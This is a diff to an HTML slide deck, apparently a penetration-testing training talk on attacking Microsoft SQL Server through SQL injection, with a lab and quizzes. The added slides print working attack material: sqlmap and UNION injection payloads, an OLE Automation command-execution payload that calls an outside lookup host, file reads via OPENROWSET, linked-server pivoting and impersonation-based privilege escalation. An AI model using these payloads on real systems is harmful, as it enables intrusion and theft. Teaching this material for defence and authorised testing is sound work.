@@ -18,6 +18,18 @@
             overflow: hidden;
         }
 
+        .img-container {
+          height: 100%;
+          max-height: 475px;
+        }
+
+        .img-container img {
+          width: 100%;
+          height: 100%;
+          object-fit: contain;
+          object-position: left center; 
+        }
+
         .presentation-container {
             width: 100vw;
             height: 100vh;
@@ -92,6 +104,7 @@
 
         .content ul li {
             margin-bottom: 18px;
+            line-height: 1.2; 
             padding-left: 30px;
             position: relative;
         }
@@ -247,8 +260,8 @@
 </head>
 <body>
     <div class="presentation-container">
-        <!-- Slide 1: Title -->
-        <div class="slide active" data-slide="1">
+        <!---->
+        <div class="slide active" data-slide="">
             <div class="center-content">
                 <div class="big-title">MSSQL Exploitation</div>
                 <div class="slide-subtitle" style="font-size: 32px; margin-bottom: 40px;">
@@ -262,9 +275,14 @@
                 </div>
             </div>
         </div>
-
-        <!-- Slide 2: The Problem -->
-        <div class="slide" data-slide="2">
+        <!---->
+        <div class="slide active" data-slide="">
+            <div class="center-content">
+                <div class="big-title">Introduction</div>
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
             <div class="slide-header">
                 <div class="slide-title">The Problem</div>
             </div>
@@ -273,8 +291,8 @@
                 <ul>
                     <li>Everyone knows <span class="emphasis">sqlmap --os-shell</span></li>
                     <li>Everyone tries <span class="emphasis">xp_cmdshell</span> first</li>
-                    <li>What happens when these don't work?</li>
                     <li>Modern defenses detect and block common techniques</li>
+                    <li>What happens when these don't work?</li>
                     <li><span class="highlight">Real-world scenarios require deeper knowledge</span></li>
                 </ul>
                 
@@ -284,8 +302,8 @@
             </div>
         </div>
 
-        <!-- Slide 3: MSSQL Overview -->
-        <div class="slide" data-slide="3">
+        <!---->
+        <div class="slide" data-slide="">
             <div class="slide-header">
                 <div class="slide-title">MSSQL Database Basics</div>
             </div>
@@ -314,27 +332,8 @@
             </div>
         </div>
 
-        <!-- Slide 4: MSSQL Overview 2 -->
-        <div class="slide" data-slide="3">
-            <div class="slide-header">
-                <div class="slide-title">MSSQL Database Basics</div>
-            </div>
-            <div class="content">
-                <h2>Common Stored Procedures</h2>
-                <div style="margin-top: 30px;">
-                    <h3>Examples</h3>
-                    <ul>
-                        <li><span class="emphasis">xp_cmdshell</span> - OS command execution</li>
-                        <li><span class="emphasis">xp_dirtree / xp_fileexist</span> - File enumeration & SMB relay</li>
-                        <li><span class="emphasis">sp_start_job</span> - SQL Agent job execution</li>
-                        <li><span class="emphasis">xp_regread / xp_regwrite</span> - Registry access</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-
-        <!-- Slide 4: Enumeration -->
-        <div class="slide" data-slide="4">
+        <!---->
+        <div class="slide" data-slide="">
             <div class="slide-header">
                 <div class="slide-title">Enumeration from Perimeter</div>
             </div>
@@ -354,8 +353,8 @@
             </div>
         </div>
 
-        <!-- Slide 5: SQL Injection Types -->
-        <div class="slide" data-slide="5">
+        <!---->
+        <div class="slide" data-slide="">
             <div class="slide-header">
                 <div class="slide-title">SQL Injection Context Matters</div>
             </div>
@@ -385,8 +384,8 @@ SELECT current_user; SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin; EXEC sp_
             </div>
         </div>
 
-        <!-- Slide 5: SQL Injection Types -->
-        <div class="slide" data-slide="5">
+        <!-- -->
+        <div class="slide" data-slide="">
             <div class="slide-header">
                 <div class="slide-title">SQL Injection Context Matters</div>
             </div>
@@ -416,148 +415,489 @@ SELECT current_user; SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin; EXEC sp_
                 </div>
             </div>
         </div>
-
-
-<!-- Slide: Attack Vectors Comparison Table -->
-        <div class="slide" data-slide="X">
+        <!---->
+        <div class="slide active" data-slide="">
+            <div class="center-content">
+                <div class="big-title">Controlling The Attack</div>
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
             <div class="slide-header">
-                <div class="slide-title">Attack Vectors: Requirements & Detection</div>
+                <div class="slide-title">Controlling the Attack</div>
             </div>
             <div class="content">
-                <h2>Complete Comparison Matrix (Sorted by Detectability)</h2>
+                <h2>SQLMap: Manual Queries (<span class="emphasis">--sql-shell</span>)</h2>
+                <div class="code-block" style="font-size: 15px;">
+sqlmap -u "http://vulnerable/user?id=1" --random-agent --fresh-queries --proxy="http://localhost:8080" --sql-shell <br>
+sql-shell> SELECT @@VERSION;<br><br>
+SELECT @@version: 'Microsoft SQL Server 2022 (RTM-CU22-GDR) (KB5072936) - 16.0.4230.2 (X64) \\n\\tNov 25 2025 23:31:11 \\n\\tCopyright (C) 2022 Microsoft Corporation\\n\\tDeveloper Edition (64-bit) on Linux (Ubuntu 22.04.5 LTS) <X64>'
+                </div>
+                <div style="margin-top: 25px; font-size: 18px;">
+                    <strong style="color: #ffd700;">Pro Tip:</strong> Use <span class="emphasis">--random-agent</span> default agent is easy to detect and block<br>
+                    <strong style="color: #ffd700;">Pro Tip:</strong> Use <span class="emphasis">--fresh-queries</span> to receive the correct value (no cache)<br>
+                    <strong style="color: #ffd700;">Pro Tip:</strong> Use <span class="emphasis">--proxy</span> to debug with burp
+                </div>
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Controlling the Attack</div>
+            </div>
+            <div class="img-container">
+                <img src="./images/sqli_types.png">
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Controlling the Attack</div>
+            </div>
+            <div class="img-container">
+                <img src="./images/sql_shell_to_burp.png">
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Controlling the Attack</div>
+            </div>
+            <div class="img-container">
+                <img src="./images/sql_shell_to_burp_clean.png">
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Controlling the Attack</div>
+            </div>
+            <div class="img-container">
+                <img src="./images/sql_shell_to_burp_enumration.png">
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Controlling the Attack</div>
+            </div>
+            <div class="code-block" style="font-size: 15px;">
+                <p>sql-shell> SELECT name, value, value_in_use  FROM <span class="emphasis">sys.configurations</span>;</p><br>
+                <p>SELECT * FROM users WHERE id = 1 UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT name, value, value_in_use  FROM <span class="emphasis">sys.dbo.configurations</span> FOR JSON AUTO, INCLUDE_NULL_VALUES)+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113),NULL,NULL,NULL-- Wkju</p><br>
+                <p>SELECT * FROM users WHERE id = 1 UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+ISNULL(CAST(name AS VARCHAR(4000)),CHAR(32))+CHAR(106)+CHAR(97)+CHAR(117)+CHAR(111)+CHAR(111)+CHAR(105)+ISNULL(CAST(value AS VARCHAR(4000)),CHAR(32))+CHAR(106)+CHAR(97)+CHAR(117)+CHAR(111)+CHAR(111)+CHAR(105)+ISNULL(CAST(value_in_use  AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113),NULL,NULL,NULL FROM  <span class="emphasis">sys.dbo.configurations</span>-- hMEW</p><br>
+                <p>SELECT * FROM users WHERE id = 1 UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT name, value, value_in_use  FROM <span class="emphasis">sys.dbo.configurations</span> FOR JSON AUTO, INCLUDE_NULL_VALUES)+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113),NULL,NULL,NULL-- RwlZ</p><br>
+                <p>SELECT * FROM users WHERE id = 1 UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+ISNULL(CAST(COUNT(*) AS VARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113),NULL,NULL,NULL FROM <span class="emphasis">sys.dbo.configurations</span>-- QoEf</p><br>
+                <p>SELECT * FROM users WHERE id = 1 AND 3220 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)+(SELECT ISNULL(CAST(COUNT(*) AS VARCHAR(4000)),CHAR(32)) FROM <span class="emphasis">sys.dbo.configurations</span>)+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(98)+CHAR(113)))</p>
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Controlling the Attack</div>
+            </div>
+            <div class="content">
+                <div class="img-container" style="padding: 0%;">
+                    <img src="./images/sql_shell_to_burp_fixing_sp_configuration.png">
+                </div>
+                <div style="margin-top: 10px; font-size: 18px;">
+                    <strong style="color: #ffd700;">Pro Tip:</strong> not all SQLi will have the same verbose level<br>
+                </div>
+                <ul>
+                    <li>start with only one column (i.e.: <span class="emphasis">name</span>)<br>
+                    <li style="line-height: 0.5;">If needed, use <span class="emphasis">CAST(value_in_use AS VARCHAR(100))</span> to receive the correct value (no cache)<br>
+                </ul>
+            </div>
+        </div>
+
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Quick Reference: SP Alternatives</div>
+            </div>
+            <div class="content">
                 <div style="overflow-x: auto; margin-top: 20px;">
                     <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
                         <thead>
                             <tr style="background: rgba(212, 175, 55, 0.2); border-bottom: 2px solid #d4af37;">
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Attack Vector</th>
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Min Privileges</th>
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Default Config</th>
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Requirements</th>
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Detectability</th>
+                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Stored Procedure</th>
+                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Direct Query Alternative</th>
+                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Attack Type</th>
                             </tr>
                         </thead>
                         <tbody>
-                            <!-- LOW DETECTABILITY -->
                             <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">xp_dirtree</td>
-                                <td style="padding: 10px 8px;">public role</td>
-                                <td style="padding: 10px 8px;">Enabled by default</td>
-                                <td style="padding: 10px 8px;">Network SMB connectivity</td>
-                                <td style="padding: 10px 8px; color: #4ecdc4; font-weight: 600;">Low - legitimate use</td>
+                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_configure</td>
+                                <td style="padding: 10px 8px;">SELECT * FROM sys.configurations</td>
+                                <td style="padding: 10px 8px;">Configuration Recon</td>
                             </tr>
                             <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">xp_fileexist</td>
-                                <td style="padding: 10px 8px;">public role</td>
-                                <td style="padding: 10px 8px;">Enabled by default</td>
-                                <td style="padding: 10px 8px;">Network SMB connectivity</td>
-                                <td style="padding: 10px 8px; color: #4ecdc4; font-weight: 600;">Low - legitimate use</td>
+                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_helplogins</td>
+                                <td style="padding: 10px 8px;">SELECT * FROM sys.server_principals</td>
+                                <td style="padding: 10px 8px;">Account Discovery</td>
                             </tr>
-                            
-                            <!-- MEDIUM DETECTABILITY -->
-                            <tr style="border-bottom: 1px solid #333; background: rgba(255, 165, 0, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_start_job</td>
-                                <td style="padding: 10px 8px;">sysadmin OR SQLAgentUserRole</td>
-                                <td style="padding: 10px 8px;">Agent must run</td>
-                                <td style="padding: 10px 8px;">Jobs in msdb database</td>
-                                <td style="padding: 10px 8px; color: #ffa500; font-weight: 600;">Medium - less monitored</td>
+                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
+                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_helpsrvrolemember</td>
+                                <td style="padding: 10px 8px;">SELECT * FROM sys.server_role_members</td>
+                                <td style="padding: 10px 8px;">Permission Mapping</td>
                             </tr>
-                            <tr style="border-bottom: 1px solid #333; background: rgba(255, 165, 0, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">xp_regread</td>
-                                <td style="padding: 10px 8px;">sysadmin role</td>
-                                <td style="padding: 10px 8px;">Enabled by default</td>
-                                <td style="padding: 10px 8px;">Registry access perms</td>
-                                <td style="padding: 10px 8px; color: #ffa500; font-weight: 600;">Medium</td>
+                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
+                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_databases</td>
+                                <td style="padding: 10px 8px;">SELECT name FROM sys.databases</td>
+                                <td style="padding: 10px 8px;">Database Enumeration</td>
                             </tr>
-                            <tr style="border-bottom: 1px solid #333; background: rgba(255, 165, 0, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">Linked Server</td>
-                                <td style="padding: 10px 8px;">Depends on link config</td>
-                                <td style="padding: 10px 8px;">Must be configured</td>
-                                <td style="padding: 10px 8px;">Valid linked server exists</td>
-                                <td style="padding: 10px 8px; color: #ffa500; font-weight: 600;">Medium - query dependent</td>
-                            </tr>
-                            <tr style="border-bottom: 1px solid #333; background: rgba(255, 165, 0, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">BULK INSERT</td>
-                                <td style="padding: 10px 8px;">BULK OPS or sysadmin</td>
-                                <td style="padding: 10px 8px;">Always available</td>
-                                <td style="padding: 10px 8px;">File system access</td>
-                                <td style="padding: 10px 8px; color: #ffa500; font-weight: 600;">Medium</td>
-                            </tr>
-                            
-                            <!-- VARIES -->
-                            <tr style="border-bottom: 1px solid #333; background: rgba(136, 136, 136, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_executesql</td>
-                                <td style="padding: 10px 8px;">Depends on query</td>
-                                <td style="padding: 10px 8px;">Always available</td>
-                                <td style="padding: 10px 8px;">Stacked queries in SQLi</td>
-                                <td style="padding: 10px 8px; color: #888; font-weight: 600;">Varies</td>
+                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
+                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">sp_helpdb</td>
+                                <td style="padding: 10px 8px;">SELECT * FROM sys.master_files</td>
+                                <td style="padding: 10px 8px;">File Path Discovery</td>
                             </tr>
                         </tbody>
                     </table>
                 </div>
             </div>
         </div>
-
-<!-- Slide: Attack Vectors Comparison Table -->
-        <div class="slide" data-slide="X">
+        <!---->
+        <div class="slide active" data-slide="">
+            <div class="center-content">
+                <div class="big-title">Ole Automation Procedures (RCE)</div>
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
             <div class="slide-header">
-                <div class="slide-title">Attack Vectors: Requirements & Detection</div>
+                <div class="slide-title">Ole Automation Procedures (RCE)</div>
             </div>
             <div class="content">
-                <h2>Complete Comparison Matrix (Sorted by Detectability)</h2>
+                <h2>What it is?</h2>
+                <ul>
+                    <li>SQL Server feature that allows creation and manipulation of OLE/COM objects from MSSQL</li>
+                    <li>Disabled by default but often enabled for legacy application compatibility</li>
+                    <li>Uses stored procedures: <span class="emphasis">sp_OACreate</span> and <span class="emphasis">sp_OAMethod</span></li>
+                    <li>Can instantiate <span class="emphasis">wscript.shell</span> or <span class="emphasis">shell.shell</span> COM objects to execute OS commands</li>
+                </ul>
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Ole Automation Procedures (RCE)</div>
+            </div>
+            <div class="content">
                 <div style="overflow-x: auto; margin-top: 20px;">
                     <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
                         <thead>
                             <tr style="background: rgba(212, 175, 55, 0.2); border-bottom: 2px solid #d4af37;">
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Attack Vector</th>
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Min Privileges</th>
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Default Config</th>
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Requirements</th>
-                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Detectability</th>
+                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Action Rquired</th>
+                                <th style="padding: 12px 8px; text-align: left; color: #d4af37; font-weight: 600;">Privilege</th>
                             </tr>
                         </thead>
                         <tbody>
-                            <!-- HIGH DETECTABILITY -->
-                            <tr style="border-bottom: 1px solid #333; background: rgba(255, 107, 107, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">xp_cmdshell</td>
-                                <td style="padding: 10px 8px;">sysadmin role</td>
-                                <td style="padding: 10px 8px;">Disabled by default</td>
-                                <td style="padding: 10px 8px;">Must enable via sp_configure</td>
-                                <td style="padding: 10px 8px; color: #ff6b6b; font-weight: 600;">High - monitored</td>
+                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
+                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">Execute sp_OACreate</td>
+                                <td style="padding: 10px 8px;">Public role (any user)</td>
                             </tr>
-                            <tr style="border-bottom: 1px solid #333; background: rgba(255, 107, 107, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">xp_regwrite</td>
-                                <td style="padding: 10px 8px;">sysadmin role</td>
-                                <td style="padding: 10px 8px;">Enabled by default</td>
-                                <td style="padding: 10px 8px;">Registry write perms</td>
-                                <td style="padding: 10px 8px; color: #ff6b6b; font-weight: 600;">High - unusual</td>
+                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
+                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">Execute sp_OAMethod</td>
+                                <td style="padding: 10px 8px;">Public role (any user)</td>
                             </tr>
-                            <tr style="border-bottom: 1px solid #333; background: rgba(255, 107, 107, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">OPENROWSET</td>
-                                <td style="padding: 10px 8px;">AdHocDistributedQueries</td>
-                                <td style="padding: 10px 8px;">Disabled by default</td>
-                                <td style="padding: 10px 8px;">Enable via sp_configure</td>
-                                <td style="padding: 10px 8px; color: #ff6b6b; font-weight: 600;">High - rarely used</td>
-                            </tr>
-                            <tr style="border-bottom: 1px solid #333; background: rgba(255, 107, 107, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">xp_servicecontrol</td>
-                                <td style="padding: 10px 8px;">sysadmin role</td>
-                                <td style="padding: 10px 8px;">Enabled by default</td>
-                                <td style="padding: 10px 8px;">Service control perms</td>
-                                <td style="padding: 10px 8px; color: #ff6b6b; font-weight: 600;">High - service manipulation</td>
-                            </tr>
-                            <tr style="background: rgba(255, 107, 107, 0.05);">
-                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">Ole Automation</td>
-                                <td style="padding: 10px 8px;">Must be enabled</td>
-                                <td style="padding: 10px 8px;">Disabled by default</td>
-                                <td style="padding: 10px 8px;">Ole Automation enabled</td>
-                                <td style="padding: 10px 8px; color: #ff6b6b; font-weight: 600;">High - dangerous</td>
+                            <tr style="border-bottom: 1px solid #333; background: rgba(78, 205, 196, 0.05);">
+                                <td style="padding: 10px 8px; color: #ffd700; font-weight: 600;">Enable OLE Automation</td>
+                                <td style="padding: 10px 8px;">sysadmin OR alter settings</td>
                             </tr>
                         </tbody>
                     </table>
                 </div>
+                <div class="code-block" style="font-size: 15px;">
+SELECT CONCAT('sysadmin:',IS_SRVROLEMEMBER('sysadmin'),'|ALTER_SETTINGS:',HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS'),'|CONTROL_SERVER:',HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER'),'|OLE_enabled:',CAST((SELECT value_in_use FROM sys.configurations WHERE name='Ole Automation Procedures') AS VARCHAR))
+<br>
+<br>
+                    <strong style="color: #d4af37;">Example Output: "sysadmin:1|ALTER_SETTINGS:1|CONTROL_SERVER:1|OLE_enabled:0"</strong>
+                </div>
+                <div style="margin-top: 25px; font-size: 18px;">
+                    <strong style="color: #d4af37;">Pro Tip:</strong> Use <span class="emphasis">CONCAT</span> to output multiple columns in a single one
+                </div>
             </div>
         </div>
-   <div class="slide-counter">
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Quizz Question</div>
+            </div>
+            <div class="content">
+                <h2>Is it possible to get RCE via OLE Automation Procedures if the query below returns? <span class="emphasis">"sysadmin:1|ALTER_SETTINGS:1|CONTROL_SERVER:1|OLE_enabled:0"</span></h2>
+                <div></div>
+                <div class="code-block" style="font-size: 15px;">
+SELECT CONCAT('sysadmin:',IS_SRVROLEMEMBER('sysadmin'),'|ALTER_SETTINGS:',HAS_PERMS_BY_NAME(NULL,NULL,'ALTER SETTINGS'),'|CONTROL_SERVER:',HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER'),'|OLE_enabled:',CAST((SELECT value_in_use FROM sys.configurations WHERE name='Ole Automation Procedures') AS VARCHAR))
+                </div>
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Real-World Scenarios</div>
+            </div>
+            <div class="img-container">
+                <img src="./images/sp_oacreate_exec.png">
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Real-World Scenarios</div>
+            </div>
+                <div class="img-container">
+                    <img src="./images/select_from_openrowset.png">
+                </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Real-World Scenarios</div>
+            </div>
+                <div class="img-container">
+                    <img src="./images/select_from_output.png">
+                </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Real-World Scenarios</div>
+            </div>
+            <div class="content">
+                <h3 style="margin-top: 30px;">RCE via OLE stored procedures</h3>
+                <div class="code-block">
+                    DECLARE @o INT; EXEC sp_OACreate 'wscript.shell',@o OUT; EXEC sp_OAMethod @o,'run',NULL,'cmd /c nslookup AAAA.oastify.com > c:\windows\temp\out.txt';
+                </div>
+                <h3 style="margin-top: 30px;">Read local files via OPENROWSET</h3>
+                <div class="code-block">
+                    CREATE TABLE output(data VARCHAR(8000));<br>
+                    INSERT INTO output SELECT * FROM OPENROWSET(BULK 'c:\windows\temp\out.txt', SINGLE_CLOB) AS x;<br>
+                    UNION SELECT NULL,...,NULL,data FROM output;
+                </div>
+            </div>
+        </div>
+
+
+
+        <!---->
+        <div class="slide active" data-slide="">
+            <div class="center-content">
+                <div class="big-title">Linked Server Exploitation</div>
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Linked Server Exploitation</div>
+            </div>
+            <div class="content">
+                <h2>Lateral Movement via Database Links</h2>
+                
+                <h3>What are Linked Servers?</h3>
+                <ul>
+                    <li>Allow one SQL Server to query another</li>
+                    <li>Can connect to different database types (Oracle, MySQL)</li>
+                    <li>Often configured with privileged accounts</li>
+                    <li><span class="highlight">Perfect for lateral movement</span></li>
+                </ul>
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Attacking Through Links</div>
+            </div>
+            <div class="content">
+                <h2>Enumerating link servers</h2>
+                
+                <div class="code-block" style="font-size: 15px;">
+                    SELECT * FROM sys.servers WHERE is_linked = 1;
+                </div>
+                <div class="code-block" style="font-size: 15px;">
+                    UNION SELECT NULL,...,CONCAT(name, ' | ', data_source, ' | ', product, ' | RPC:', is_rpc_out_enabled, ' | DA:', is_data_access_enabled) FROM sys.servers WHERE is_linked = 1
+                </div>
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Linked Server Exploitation</div>
+            </div>
+            <div class="content">
+                <h2>Attack examples</h2>
+                <ul>
+                    <li>Dump more DBs information</li>
+                    <li>Second persistence server (more under radar)</li>
+                    <li>Extract SMB hashes [usually require internal access or inital foothold (First MSSQL)]</li>
+                </ul>
+                <div style="margin-top: 25px; font-size: 18px;">
+                    <strong style="color: #ffd700;">Pro Tip:</strong> SQL injection in MSSQL can be exploited to establish persistence through .NET Core-based agents
+                    https://github.com/MythicAgents/Athena
+                </div>
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Real-World Scenarios</div>
+            </div>
+            <div class="img-container">
+                <img src="./images/linked_server_enum.png">
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Real-World Scenarios</div>
+            </div>
+            <div class="img-container">
+                <img src="./images/linked_server_pivot.png">
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Quizz Question</div>
+            </div>
+            <div class="content">
+                <h2>Scenario:</h2>
+                <div>A SQL Server database was found leaked on the dark web. The Incident Response (IR) team informs you that the IT team has already fixed the vulnerability and asks you to retest it to confirm remediation.</div>
+                <h2>Question:</h2>
+                <div>As a responsible security expert, what proactive validation should you initiate with your colleagues from the IR team?</div>
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Quizz Question</div>
+            </div>
+            <div class="content">
+                <h2>Response:</h2>
+                <ul>
+                    <li>Mapping the complete linked server topology (both directions)</li>
+                    <li>Hunting for IOCs across all linked databases</li>
+                    <li>Analyzing logs for evidence of lateral movement</li>
+                    <li>Checking for persistence mechanisms on each linked server</li>
+                    <li>Only then confirming the incident was contained</li>
+                </ul>
+            </div>
+        </div>
+        <div class="slide active" data-slide="">
+            <div class="center-content">
+                <div class="big-title">Testing Lab</div>
+            </div>
+        </div>
+        <!-- -->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Testing Lab</div>
+            </div>
+            <div class="img-container">
+                <img src="./images/testing_lab.png">
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Testing Lab</div>
+            </div>
+            <div class="content">
+                <div class="code-block">
+                    # Status<br>
+kubectl get pods -n pentest-lab<br>
+# Delete and recreate<br>
+kubectl delete deployment -n pentest-lab vulnerable-app<br>
+kubectl apply -f mssql-pentest-lab.yaml<br>
+# Forward port to access via browser & cli<br>
+kubectl port-forward -n pentest-lab svc/vulnerable-app 5000:5000<br>
+kubectl port-forward -n pentest-lab svc/mssql 1433:1433<br>
+# Connect to the DB<br>
+kubectl exec -it -n pentest-lab deployment/mssql -- /bin/bash<br>
+/opt/mssql-tools18/bin/sqlcmd -S localhost -U sa -P 'YourStrong@Passw0rd' -C<br>
+# Watch the logs<br>
+kubectl logs -n pentest-lab -l app=vulnerable-app -f<br>
+                </div>
+            </div>
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Exercise: Impersonate Users (MSSQL EoP)</div>
+            </div>
+            <div class="content">
+                <h2>Connect to test MSSQL Server</h2>
+                <div class="code-block">
+kubectl exec -it -n pentest-lab deployment/mssql -- /bin/bash<br>
+/opt/mssql-tools18/bin/sqlcmd -S localhost -U sa -P 'YourStrong@Passw0rd' -C<br>
+                </div>
+                <h2>Create a vulnerable user</h2>
+                <div class="code-block">
+USE master;<br>
+GO<br>
+CREATE LOGIN imp_login WITH PASSWORD = 'P@ssw0rd!';<br>
+GO<br>
+GRANT IMPERSONATE ON LOGIN::imp_login TO PUBLIC;<br>
+GO
+                </div>
+            </div>
+
+        </div>
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="slide-header">
+                <div class="slide-title">Exercise: Impersonate Users (MSSQL EoP)</div>
+            </div>
+            <div class="content">
+                <h2>Search vulnerable users</h2>
+                <div class="code-block">
+UNION SELECT NULL,NULL,CAST(grantor.name+' CAN IMPERSONATE '+grantee.name AS VARCHAR(200)) COLLATE DATABASE_DEFAULT,NULL,NULL FROM sys.server_permissions p JOIN sys.server_principals grantor ON p.grantor_principal_id=grantor.principal_id JOIN sys.server_principals grantee ON p.grantee_principal_id=grantee.principal_id WHERE p.permission_name='IMPERSONATE'--<br>
+<br>
+                </div>
+                <h2>Impersonate the user</h2>
+                <div class="code-block">
+EXECUTE AS LOGIN = 'imp_user'; SELECT IS_SRVROLEMEMBER('sysadmin');--
+                </div>
+            </div>
+
+        </div>
+
+        <!---->
+        <div class="slide" data-slide="">
+            <div class="center-content">
+                <h2 style="font-size: 48px; color: #d4af37; margin-bottom: 40px;">Key Takeaways</h2>
+                <div style="text-align: left; max-width: 900px;">
+                    <ul style="font-size: 24px; line-height: 2;">
+                        <li>MSSQL offers many attack vectors beyond xp_cmdshell</li>
+                        <li>SQL Server Agent jobs are powerful and underutilized</li>
